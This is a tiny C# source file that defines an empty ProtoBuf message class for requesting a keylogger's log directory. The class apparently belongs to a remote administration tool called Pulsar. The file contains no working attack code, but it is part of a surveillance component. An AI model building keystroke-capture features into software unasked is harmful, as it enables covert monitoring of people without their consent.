using ProtoBuf;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Monitoring.KeyLogger
{
    [ProtoContract]
    public class GetKeyloggerLogsDirectory : IMessage
    {
    }
}
